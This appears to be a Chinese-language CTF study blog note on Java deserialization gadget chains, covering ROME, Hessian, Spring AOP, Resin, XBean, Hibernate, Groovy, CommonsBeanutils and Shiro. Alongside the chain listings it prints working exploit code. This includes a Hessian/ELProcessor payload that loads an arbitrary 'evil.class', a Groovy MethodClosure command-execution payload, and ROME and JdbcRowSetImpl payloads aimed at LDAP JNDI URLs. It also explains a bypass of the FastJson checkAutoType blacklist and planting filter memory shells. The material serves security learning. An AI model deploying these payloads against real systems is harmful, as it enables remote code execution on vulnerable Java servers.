EqualsBean.beanHashCode()
EqualsBean.hashCode()
ObjetBean.hashCode()
HashMap&lt;K,V&gt;.hash(Object)
HashMap&lt;K,V&gt;.readObject(ObjectInputStream)
#### HashTable 利用链
利用链：
TemplatesImpl.getOutputProperties()
ToStringBean.toString(String)
ToStringBean.toString()
EqualsBean.beanHashCode()
EqualsBean.hashCode()
ObjetBean.hashCode()
HashTable.reconstitutionPut()
HashTable.readObject(ObjectInputStream)
#### BadAttributeValueExpException 利用链
利用链：
TemplatesImpl.getOutputProperties()
ToStringBean.toString(String)
ToStringBean.toString()
BadAttributeValueExpException.readObject()
#### HotSwappableTargetSource 利用链
利用链：
TemplatesImpl.getOutputProperties()
ToStringBean.toString(String)
ToStringBean.toString
XString.equals()
HotSwappableTargetSource.equals()
HashMap.putVal()
HashMap.readObject()
#### JdbcRowSetImpl 利用链
利用链：
JdbcRowSetImpl.connect()
JdbcRowSetImpl.getDatabaseMetaData()
ToStringBean.toString(String)
ToStringBean.toString()
EqualsBean.beanHashCode()
EqualsBean.hashCode()
ObjetBean.hashCode()
HashMap&lt;K,V&gt;.hash(Object)
HashMap&lt;K,V&gt;.readObject(ObjectInputStream)
#### EqualsBean 利用链
利用链：
TemplatesImpl.getOutputProperties()
EqualsBean.beanEquals()
EqualsBean.equals()
AbstractMap.equals()
HashMap.putVal()
HashMap.put()
HashSet.readObject()

### Hessian  https://su18.org/post/hessian/#rome
#### Groovy

ConvertedClosure-》MethodClosure  doCall 方法进一步调用 ContinuationDirContext#listBindings
TreeMap.compareTo()
MapDeserializer.readMap()
SerializerFactory.readMap()
Hessian2Input.readObject()




#### ROME
JdbcRowSetImpl.getDatabaseMetaData()
ToStringBean.toString() (com.sun.syndication.feed.impl)
EqualsBean.beanHashCode() (com.sun.syndication.feed.impl)
ObjectBean.hashCode()
HashMap.hash()
HashMap.put()
MapDeserializer.readMap()
SerializerFactory.readMap()
Hessian2Input.readObject()

#### PartiallyComparableAdvisorHolder
SimpleJndiBeanFactory.doGetType() (org.springframework.jndi.support)
SimpleJndiBeanFactory.getType() (org.springframework.jndi.support)
BeanFactoryAspectInstanceFactory.getOrder() (org.springframework.aop.aspectj.annotation)
AbstractAspectJAdvice.getOrder (org.springframework.aop.aspectj)
AspectJPointcutAdvisor.getOrder() (org.springframework.aop.aspectj)
AspectJAwareAdvisorAutoProxyCreator$PartiallyComparableAdvisorHolder.toString() (org.springframework.aop.aspectj.autoproxy)
XString.equals() (com.sun.org.apache.xpath.internal.objects)
HotSwappableTargetSource.equals()    (org.springframework.aop.target) //可忽略
HashMap.putVal()
HashMap.put()
MapDeserializer.readMap()
SerializerFactory.readMap()
Hessian2Input.readObject()
#### AbstractBeanFactoryPointcutAdvisor
SimpleJndiBeanFactory.getBean() (org.springframework.jndi.support)
AbstractBeanFactoryPointcutAdvisor.getAdvice()  (org.springframework.aop.support)  // 主要
AbstractPointcutAdvisor.equals()   (org.springframework.aop.support)
HotSwappableTargetSource.equals()    (org.springframework.aop.target) 
HashMap.putVal()
HashMap.put()
MapDeserializer.readMap()
SerializerFactory.readMap()
Hessian2Input.readObject()
#### Resin链
NamingManager.getObjectFactoryFromReference() (javax.naming.spi)
NamingManager.getObjectInstance() (javax.naming.spi)
NamingManager.getContext() (javax.naming.spi)
ContinuationContext.getTargetContext() (javax.naming.spi)
ContinuationContext.composeName() (javax.naming.spi)   // 关键点
QName.toString() (com.caucho.naming)     // 关键点
XString.equals() (com.sun.org.apache.xpath.internal.objects)
HashMap.putVal()
HashMap.put()
MapDeserializer.readMap()
SerializerFactory.readMap()
Hessian2Input.readObject()
#### XBean链
NamingManager.getObjectFactoryFromReference() (javax.naming.spi)
NamingManager.getObjectInstance() (javax.naming.spi)
ContextUtil.resolve()   (org.apache.xbean.naming.context)// 关键点
ContextUtil$ReadOnlyBinding.getObject() (org.apache.xbean.naming.context)// 关键点
Binding.toString() (com.caucho.naming)     // 关键点
XString.equals() (com.sun.org.apache.xpath.internal.objects)
HotSwappableTargetSource.equals()
HashMap.putVal()
HashMap.put()
MapDeserializer.readMap()
SerializerFactory.readMap()
Hessian2Input.readObject()

### AspectJPointcutAdvisor
//反序列化时AspectJPointcutAdvisor.der会被调用，会触发AspectJAroundAdvice.getOrder
getOrder会被调用，会触发AspectJAroundAdvice.getOrder

### AspectJAroundAdvice
//反序列化时AspectJAroundAdvice.getOrder会被调用，会触发BeanFactoryAspectInstanceFactory.getOrder
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BeanFactoryAspectInstanceFactory.getOrder</span><br><span class="line">        AspectInstanceFactory aif = Reflections.createWithoutConstructor(BeanFactoryAspectInstanceFactory.class);</span><br><span class="line">        Reflections.setFieldValue(aif, &quot;beanFactory&quot;, bf);</span><br><span class="line">        Reflections.setFieldValue(aif, &quot;name&quot;, jndiUrl);</span><br></pre></td></tr></table></figure>


### SimpleJndiBeanFactory -&gt;lookup 前AspectJAroundAdvice
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">String jndiUrl = &quot;ldap://localhost:1389/obj&quot;;</span><br><span class="line">      	 SimpleJndiBeanFactory bf = new SimpleJndiBeanFactory();</span><br><span class="line">      	 bf.setShareableResources(jndiUrl);</span><br><span class="line">       Reflections.setFieldValue(bf, &quot;logger&quot;, new NoOpLog());</span><br><span class="line">       Reflections.setFieldValue(bf.getJndiTemplate(), &quot;logger&quot;, new NoOpLog());</span><br><span class="line"></span><br></pre></td></tr></table></figure>
### SpringPartiallyComparableAdvisorHolder链
借助AOP依赖  Hessian提供入口

### SpringAbstractBeanFactoryPointcutAdvisor -》SimpleJndiBeanFactory-》lookup


### ResouceRef+ELProccessor RCE
可不可以直接动态执行指令 不是类加载式的rce
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line">public class ELProcessChain &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        byte[] bytes = Files.readAllBytes(Paths.get(&quot;E:\\CTFLearning\\Java\\ResinChain\\target\\classes\\com\\example\\resinchain\\evil.class&quot;));</span><br><span class="line">        String s1 = Base64.getEncoder().encodeToString(bytes);</span><br><span class="line">        System.out.println(s1);</span><br><span class="line">        String x = &quot;var str=&#x27;&quot;+s1+&quot;&#x27;;var Thread = Java.type(&#x27;java.lang.Thread&#x27;);var tt=Thread.currentThread().getContextClassLoader();var b64 = Java.type(&#x27;sun.misc.BASE64Decoder&#x27;);var b=new b64().decodeBuffer(str);var byteArray = Java.type(&#x27;byte[]&#x27;);var int = Java.type(&#x27;int&#x27;);var defineClassMethod = java.lang.ClassLoader.class.getDeclaredMethod(&#x27;defineClass&#x27;,byteArray.class,int.class,int.class);defineClassMethod.setAccessible(true);var cc = defineClassMethod.invoke(tt,b,0,b.length);cc.newInstance();&quot;;</span><br><span class="line">        //String x = &quot;java.lang.Runtime.getRuntime().exec(\\\&quot;calc\\\&quot;)&quot;;</span><br><span class="line">        ResourceRef resourceRef = new ResourceRef(&quot;javax.el.ELProcessor&quot;, (String)null, &quot;&quot;, &quot;&quot;, true, &quot;org.apache.naming.factory.BeanFactory&quot;, (String)null);</span><br><span class="line">        resourceRef.add(new StringRefAddr(&quot;forceString&quot;, &quot;pupi1=eval&quot;));</span><br><span class="line">        resourceRef.add(new StringRefAddr(&quot;pupi1&quot;, &quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;js\&quot;).eval(\&quot;&quot;+ x +&quot;\&quot;)&quot;));</span><br><span class="line">        Class&lt;?&gt; ccCl = Class.forName(&quot;javax.naming.spi.ContinuationDirContext&quot;); //$NON-NLS-1$</span><br><span class="line">        Constructor&lt;?&gt; ccCons = ccCl.getDeclaredConstructor(CannotProceedException.class, Hashtable.class);</span><br><span class="line">        ccCons.setAccessible(true);</span><br><span class="line">        CannotProceedException cpe = new CannotProceedException();</span><br><span class="line"></span><br><span class="line">        cpe.setResolvedObj(resourceRef);</span><br><span class="line">        DirContext ctx = (DirContext) ccCons.newInstance(cpe, new Hashtable&lt;&gt;());</span><br><span class="line"></span><br><span class="line">//       jdk.nashorn.internal.objects.NativeString str = new jdk.nashorn.internal.objects.NativeString();</span><br><span class="line">        JSONObject jsonObject = new JSONObject();</span><br><span class="line">        jsonObject.put(&quot;boogipop&quot;,ctx);</span><br><span class="line">        ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="line">        Hessian2Output out = new Hessian2Output(baos);</span><br><span class="line">        baos.write(67);</span><br><span class="line">        out.getSerializerFactory().setAllowNonSerializable(true);</span><br><span class="line">        out.writeObject(jsonObject);</span><br><span class="line">        out.flushBuffer();</span><br><span class="line"></span><br><span class="line">        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());</span><br><span class="line">        Hessian2Input input = new Hessian2Input(bais);</span><br><span class="line">        input.readObject();</span><br><span class="line">        //String ret = Base64.getEncoder().encodeToString(baos.toByteArray());</span><br><span class="line">        //System.out.println(ret);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public static HashMap&lt;Object, Object&gt; makeMap ( Object v1, Object v2 ) throws Exception &#123;</span><br><span class="line">        HashMap&lt;Object, Object&gt; s = new HashMap&lt;&gt;();</span><br><span class="line">        setFieldValue(s, &quot;size&quot;, 2);</span><br><span class="line">        Class&lt;?&gt; nodeC;</span><br><span class="line">        try &#123;</span><br><span class="line">            nodeC = Class.forName(&quot;java.util.HashMap$Node&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        catch ( ClassNotFoundException e ) &#123;</span><br><span class="line">            nodeC = Class.forName(&quot;java.util.HashMap$Entry&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(true);</span><br><span class="line"></span><br><span class="line">        Object tbl = Array.newInstance(nodeC, 2);</span><br><span class="line">        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));</span><br><span class="line">        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));</span><br><span class="line">        setFieldValue(s, &quot;table&quot;, tbl);</span><br><span class="line">        return s;</span><br><span class="line">    &#125;</span><br><span class="line">    public static &lt;T&gt; T createWithoutConstructor(Class&lt;T&gt; classToInstantiate) throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">        return createWithConstructor(classToInstantiate, Object.class, new Class[0], new Object[0]);</span><br><span class="line">    &#125;</span><br><span class="line">    public static String serial(Object o) throws IOException, NoSuchFieldException &#123;</span><br><span class="line">        ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(baos);</span><br><span class="line">        //Field writeReplaceMethod = ObjectStreamClass.class.getDeclaredField(&quot;writeReplaceMethod&quot;);</span><br><span class="line">        //writeReplaceMethod.setAccessible(true);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        String base64String = Base64.getEncoder().encodeToString(baos.toByteArray());</span><br><span class="line">        return base64String;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static &lt;T&gt; T createWithConstructor(Class&lt;T&gt; classToInstantiate, Class&lt;? super T&gt; constructorClass, Class&lt;?&gt;[] consArgTypes, Object[] consArgs) throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">        Constructor&lt;? super T&gt; objCons = constructorClass.getDeclaredConstructor(consArgTypes);</span><br><span class="line">        objCons.setAccessible(true);</span><br><span class="line">        Constructor&lt;?&gt; sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);</span><br><span class="line">        sc.setAccessible(true);</span><br><span class="line">        return (T) sc.newInstance(consArgs);</span><br><span class="line">    &#125;</span><br><span class="line">    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception &#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    public static String unhash ( int hash ) &#123;</span><br><span class="line">        int target = hash;</span><br><span class="line">        StringBuilder answer = new StringBuilder();</span><br><span class="line">        if ( target &lt; 0 ) &#123;</span><br><span class="line">            // String with hash of Integer.MIN_VALUE, 0x80000000</span><br><span class="line">            answer.append(&quot;\\u0915\\u0009\\u001e\\u000c\\u0002&quot;);</span><br><span class="line"></span><br><span class="line">            if ( target == Integer.MIN_VALUE )</span><br><span class="line">                return answer.toString();</span><br><span class="line">            // Find target without sign bit set</span><br><span class="line">            target = target &amp; Integer.MAX_VALUE;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        unhash0(answer, target);</span><br><span class="line">        return answer.toString();</span><br><span class="line">    &#125;</span><br><span class="line">    private static void unhash0 ( StringBuilder partial, int target ) &#123;</span><br><span class="line">        int div = target / 31;</span><br><span class="line">        int rem = target % 31;</span><br><span class="line"></span><br><span class="line">        if ( div &lt;= Character.MAX_VALUE ) &#123;</span><br><span class="line">            if ( div != 0 )</span><br><span class="line">                partial.append((char) div);</span><br><span class="line">            partial.append((char) rem);</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            unhash0(partial, div);</span><br><span class="line">            partial.append((char) rem);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

用的仍然是BeanFactory那一套eval组合拳
进入入口getObjectFactoryFromReference
实例化BeanFactory返回
调用BeanFactory的getObjectInstance函数
反射RCE
### Hibernate1
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">HashMap.readObject()</span><br><span class="line">    TypedValue.hashCode()</span><br><span class="line">        ValueHolder.getValue()</span><br><span class="line">            ValueHolder.DeferredInitializer().initialize()</span><br><span class="line">                ComponentType.getHashCode()</span><br><span class="line">		            PojoComponentTuplizer.getPropertyValue()</span><br><span class="line">                        AbstractComponentTuplizer.getPropertyValue()</span><br><span class="line">                            BasicPropertyAccessor$BasicGetter.get()/GetterMethodImpl.get()</span><br><span class="line">                                TemplatesImpl.getOutputProperties()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HashMap.readObject()</span><br><span class="line">    TypedValue.hashCode()</span><br><span class="line">        ValueHolder.getValue()</span><br><span class="line">            ValueHolder.DeferredInitializer().initialize()</span><br><span class="line">                ComponentType.getHashCode()</span><br><span class="line">                    PojoComponentTuplizer.getPropertyValue()</span><br><span class="line">                        AbstractComponentTuplizer.getPropertyValue()</span><br><span class="line">                            BasicPropertyAccessor$BasicGetter.get()/GetterMethodImpl.get()</span><br><span class="line">                                JdbcRowSetImpl.getDatabaseMetaData()</span><br></pre></td></tr></table></figure>
### spring
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">SerializableTypeWrapper$MethodInvokeTypeProvider.readObject()</span><br><span class="line">    SerializableTypeWrapper.TypeProvider(Proxy).getType()</span><br><span class="line">	    AnnotationInvocationHandler.invoke()</span><br><span class="line">		    ReflectionUtils.invokeMethod()</span><br><span class="line">			    Templates(Proxy).newTransformer()</span><br><span class="line">				    AutowireUtils$ObjectFactoryDelegatingInvocationHandler.invoke()</span><br><span class="line">					    ObjectFactory(Proxy).getObject()</span><br><span class="line">						    TemplatesImpl.newTransformer()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SerializableTypeWrapper$MethodInvokeTypeProvider.readObject()</span><br><span class="line">    SerializableTypeWrapper.TypeProvider(Proxy).getType()</span><br><span class="line">	    AnnotationInvocationHandler.invoke()</span><br><span class="line">		    ReflectionUtils.invokeMethod()</span><br><span class="line">			    Templates(Proxy).newTransformer()</span><br><span class="line">				    JdkDynamicAopProxy.invoke()</span><br><span class="line">                        AopUtils.invokeJoinpointUsingReflection()</span><br><span class="line">						    TemplatesImpl.newTransformer()</span><br></pre></td></tr></table></figure>
###  Groovy : 1.7.0-2.4.3


AnnotationInvocationHandler.readObject()
    Map.entrySet() (Proxy)
        ConversionHandler.invoke()
            ConvertedClosure.invokeCustom()
                MethodClosure.call()
                    ProcessGroovyMethods.execute()

AnnotationInvocationHandler 反序列化时调用 memberValues 中存放对象的 entrySet 对象，这个对象是 ConvertedClosure，而这个对象又实际上是 MethodClosure 对象的代理，定义了在调用 entrySet 方法时会调用 invoke 方法去调用 MethodClosure 的 call 方法，触发 Groovy 中 String 类型的 execute 方法执行命令
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">public class Groovy &#123;</span><br><span class="line"></span><br><span class="line">	public static String fileName = &quot;Groovy.bin&quot;;</span><br><span class="line"></span><br><span class="line">	public static void main(String[] args) throws Exception &#123;</span><br><span class="line"></span><br><span class="line">		//封装我们需要执行的对象</span><br><span class="line">		MethodClosure    methodClosure = new MethodClosure(&quot;open -a Calculator.app&quot;, &quot;execute&quot;);</span><br><span class="line">		ConvertedClosure closure       = new ConvertedClosure(methodClosure, &quot;entrySet&quot;);</span><br><span class="line"></span><br><span class="line">		Class&lt;?&gt;       c           = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">		Constructor&lt;?&gt; constructor = c.getDeclaredConstructors()[0];</span><br><span class="line">		constructor.setAccessible(true);</span><br><span class="line"></span><br><span class="line">		// 创建 ConvertedClosure 的动态代理类实例</span><br><span class="line">		Map handler = (Map) Proxy.newProxyInstance(ConvertedClosure.class.getClassLoader(),</span><br><span class="line">				new Class[]&#123;Map.class&#125;, closure);</span><br><span class="line"></span><br><span class="line">		// 使用动态代理初始化 AnnotationInvocationHandler</span><br><span class="line">		InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, handler);</span><br><span class="line"></span><br><span class="line">		SerializeUtil.writeObjectToFile(invocationHandler, fileName);</span><br><span class="line">		SerializeUtil.readFileObject(fileName);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


# 学习笔记 
CommonsBeanutils 利用链中核心的触发位置就是 BeanComparator.compare() 函数，当调用 BeanComparator.compare() 函数时，其内部会调用我们前面说的 getProperty 函数，进而调用 JavaBean 中对应属性的 getter 函数

如果两个不同版本的库使用了同一个类，而这两个类可能有一些方法和属性有了变化，此时在序列化通 信的时候就可能因为不兼容导致出现隐患。因此，Java在反序列化的时候提供了一个机制，序列化时会 根据固定算法计算出一个当前类的serialVersionUID值，写入数据流中；反序列化时，如果发现对方的环境中这个类计算出的serialVersionUID不同，则反序列化就会异常退出，避免后续的未知隐患。



异常信息 org.apache.shiro.io.ClassResolvingObjectInputStream，可以看到，这是一个 ObjectInputStream 的子类，其重写了 resolveClass 方法:resolveClass 是反序列化中用来查找类的方法，在读取序列化流的时候，读到一个字符串形式的类名，需要通过这个方法来找到对应的 java.lang.Class 


TemplatesImpl的hashCode()是个Native()方法，每次运行都会改变，所以不可控。

Commons Collections提供了一组可复用的数据结构和算法的实现，旨在扩展和增强Java集合框架，以便更好地满足不同类型应用的需求。在compare不同对象时，经常用到CC 来转换类型。

寻找到某个带有危险方法的类，并且继承了序列化接口，然后再依次向上回溯，直到找到一个重写了readObject方法的类

构造器和方法都是protected权限的，也就是说只能本类内部访问，不能外部调用去实例化，那么我们就需要找到内部实例化的工具 比如public方法

1.8 8u71版本以后，对AnnotationInvocationHandler的readobject进行了改写。导致高版本中利用链无法使用。

shiro550中自带CommonsBeanutils 1.8.3 和 commons-collections-3.2.1的依赖

CC2链里面并不是使用 AnnotationInvocationHandler来构造，而是使用javassist和PriorityQueue来构造利用链。

3.1-3.2.1版本中TransformingComparator并没有去实现Serializable接口,也就是说这是不可以被序列化的。所以在利用链上就不能使用他去构造。

方法是private私有属性，我们不能直接调用，我们可以通过反射调用doCall

Set实际上相当于只存储key、不存储value的Map。我们经常用Set用于去除重复元素。因为对象不重复，因此就会涉及到比较。equals是用来比较两个对象的内容是否相同。动态代理时调用equals有意外的效果

shiro作用于中间件的filter环节，所以servlet内存马在访问阶段就被shiro干掉了，不能用。因此必须写入filter内存马，并将其放在shiro的filter前面，以便访问和利用；另外，也可以写入listener内存马，不需要操心filter顺序问题，但可能会影响服务器性能。

这些类包括：FastJson的JSONObject类、Jackson的POJONode类，ROME的ToStringBean类
目标类getter：TemplatesImpl#getOutputProperties、LdapAttribute#getAttributeDefinition、JdbcRowsetImpl#getDatabaseMetaData值得一提的是，由于是原生反序列化中的攻击，所以要求利用链上的类都要实现Serilizable接口，因此无法使用BCEL那条链（仅特殊反序列化如FastJson可用）Rome 的链核心是 ToStringBean会调用他封装类的全部无参 getter 方法


Runtime里看一下，发现它没有serializable接口，不能被序列化: 怎么办呢，我们这里可以运用反射来获取它的原型类，它的原型类class是存在serializable接口，可以序列化的  难怪CC1中需要反射形势把Runtime放进去

FastJson黑名单检查与绕过。了解过FastJson漏洞的师傅一定都知道它的checkAutoType方法，这是其核心防御机制，原本只在FastJson反序列化流程中被触发,然而到了1.2.49以后，JsonObject类中重写了readObject方法，在resolveClass中会对目标类进行checkAutoType检查，本文所述攻击方式会受影响
参考1ue师傅提出的绕过方法，给入口类对象和目标类对象套一层List、Set或Map，以BadAttributeValueExpException入口类为例，代码如下 从而使得序列化时，先给外层Map中的目标类对象建立引用映射，再在序列化JsonObject中的目标类对象时以引用类型写入目标类对象反序列化时，在恢复JsonObject中的目标类对象时，因为它是引用类型，所以不会走到resolveClass方法，实现绕过在外层Map中的时候就恢复过一次了，有缓存，所以第二次恢复就直接引用了推广一下这种绕过思路，当Gadget中的某个类在readObject里的resolveClass方法中添加了安全检查，我们只要能顺利通过入口的readObject方法，就可以将黑名单类对象转换为引用类型来绕过检测而当入口的readObject方法也做了黑名单检测之类的防御时，就需要结合二次反序列化进行绕（SignedObject、UnicastRef、JNDI.......）


Jackson getter调用顺序不稳定及解决方式。Jackson结合LDAPAttribute使用的时候不需要这部分操作，如果添加了反而会出错（当然)解决方式： https://xz.aliyun.com/t/12846 . 删除writeplace()方法这一块也早就有很多师傅提过，但因为是一个很小的点，并没有专门分析的文章，不太好直接扔链接，我也就干脆顺便提一下在Java对象的序列化流程中，如果其类（或父类）拥有writeReplace方（字面意思，writeObject 替代）就会走到类自己的序列化逻辑Jackson中的POJONode类就满足这个条件，在序列化的时候便会发生报错（Jackson序列化和Java原生序列化的数据自然是不同的）解决这个问题有多种思路，我们直接使用Javaassist字节码修改工具，删除BaseJsonNode类中的writeReplace方法即可
CtClass ctClass = ClassPool.getDefault().get(&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;);
        CtMethod writeReplace = ctClass.getDeclaredMethod(&quot;writeReplace&quot;);
        ctClass.removeMethod(writeReplace);
        ctClass.toClass();



Rome 1.12.0之前都可以用，注意1.0和后续版本中beanClass、obj的属性名有差别（低版本属性名前会有一个下划线 _ ）Rome结合TemplatesImpl利用时存在和Jackson相似的问题，可能会在调用别的getter时报错而提前终止流程这里也是采用相似的解决思路，使用Rome时可以直接在ToStringBean里指定从哪个类里获取getter，操作起来很简单

Object templatesImpl = null;
        ToStringBean toStringBean = new ToStringBean(Templates.class,templatesImpl); //在这里指定了从templates.class接口里去获取getter，
                                                                              //其中只有一个getter：getOutputProperties()
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Class Bv = Class.forName(&quot;javax.management.BadAttributeValueExpException&quot;);
        Field val = Bv.getDeclaredField(&quot;val&quot;);
        val.setAccessible(true);
        val.set(badAttributeValueExpException,toStringBean);
        serialize(badAttributeValueExpException);       
        unserialize(&quot;ser.bin&quot;);
Rome链可以结合JdbcRowSetImpl使用，乍一看没什么大不了，但对getter调用流程有了解的师傅应该会意识到问题所在getter的调用是一个一个来的，如果中途报错，流程就会中断，让我们来看看JdbcRowSetImpl里的getter（property：仅A到D）这也是为什么FastJson和Jackson结合JdbcRowSetImpl的利用都是会中途报错的public static void main(String[] args) throws Exception&#123;
        JdbcRowSetImpl jdbcRowset = new JdbcRowSetImpl();
        String url = &quot;ldap://127.0.0.1:10990&quot;;
        jdbcRowset.setDataSourceName(url);

        ToStringBean toStringBean = new ToStringBean(JdbcRowSetImpl.class,jdbcRowset);
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Class Bv = Class.forName(&quot;javax.management.BadAttributeValueExpException&quot;);
        Field val = Bv.getDeclaredField(&quot;val&quot;);
        val.setAccessible(true);
        val.set(badAttributeValueExpException,toStringBean);

        serialize(badAttributeValueExpException);
        unserialize(&quot;ser.bin&quot;);
    &#125; 
总之就是在这个机缘巧合之下，getter存放顺序很合适，使得在调用到getDatabaseMetaData()之前都不会报错从而Rome链可以结合JdbcRowSetImpl使用！

目前为止没能发现别的思路，因此Rome链确实是不可以结合LdapAttribute使用的。Rome链在1.12.0之后的版本不可用了，修复主要集中在对于ToStringBean类的修改

无论是构造方法、getter/setter 方法、readObject 等等方法都不会在 Hessian 反序列化中被触发，那怎么会产生漏洞呢？答案就在 Hessian 对 Map 类型数据的处理上，在之前的分析中提到，MapDeserializer#readMap 对 Map 类型数据进行反序列化操作是会创建相应的 Map 对象，并将 Key 和 Value 分别反序列化后使用 put 方法写入数据。Hessian不需要类实现serializable接口，有时候有奇效.默认使用的是HashMap如果制定了是SortedMap,将会创建TreeMap对象。

